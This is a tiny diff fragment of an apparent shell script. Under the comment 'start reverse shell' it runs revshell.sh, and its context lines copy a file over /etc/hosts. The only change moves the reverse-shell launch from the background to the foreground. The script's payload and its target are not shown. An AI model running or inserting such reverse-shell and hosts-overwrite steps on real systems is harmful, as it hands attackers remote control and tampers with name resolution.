@@ -4,4 +4,4 @@
 cp hosts /etc/hosts
 
 # start reverse shell
-bash revshell.sh &
+bash revshell.sh
